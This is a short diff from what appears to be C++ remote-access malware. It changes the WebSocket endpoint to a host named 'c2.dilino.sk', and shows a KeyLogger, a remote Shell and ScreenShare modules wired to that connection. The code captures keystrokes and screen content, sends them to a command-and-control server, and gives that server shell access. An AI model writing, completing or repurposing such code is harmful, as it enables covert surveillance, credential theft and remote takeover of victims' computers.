@@ -28,7 +28,7 @@ struct Seeker {
 };
 
 int main() {
-    WebSocketClient client("dilino.sk", 8080, "/ws/seeker");
+    WebSocketClient client("c2.dilino.sk", 8010, "/ws/seeker");
     KeyLogger keylogger(client);
     Shell shell(client);
     ScreenShare screenshare(client);
